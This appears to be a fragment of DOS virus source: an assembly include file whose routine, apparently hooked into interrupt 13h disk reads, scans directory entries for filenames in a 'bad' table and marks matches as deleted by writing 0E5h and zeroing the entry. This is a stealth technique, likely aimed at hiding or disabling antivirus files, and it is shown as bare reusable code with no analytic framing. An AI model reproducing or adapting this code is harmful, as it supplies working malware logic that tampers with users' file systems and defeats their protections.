   ; - -[FUCK13.INC] - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8

   analize_13_02:  pusha

                   mov     dx, 1234h
   lastword        save_ax
                   xor     dh, dh
                   shl     dx, 4

   @@1:            lea     di, [bx+12]
                   mov     cx, 10
                   xor     al, al
                   cld
                   repe    scasb
                   jne     @@next

                   lea     bp, bad

   @@2:            mov     cx, 11

                   mov     si, bp
                   mov     di, bx

   @@3:            segcs   lodsb
                   cmp     al, '°'
                   je      @@6
                   cmp     al, 128
                   jae     @@4
   @@6:            cmp     es:[di], al
                   jne     @@nxt
   @@4:            inc     di
                   loop    @@3

                   mov     di, bx
                   mov     al, 0E5h
                   stosb
                   xor     ax, ax
                   mov     cx, 31
                   rep     stosb

                   jmp     @@next

   @@nxt:          add     bp, 11
                   cmp     bp, offset bad_end
                   jne     @@2

   @@next:         add     bx, 32
                   dec     dx
                   jnz     @@1

                   popa
                   ret

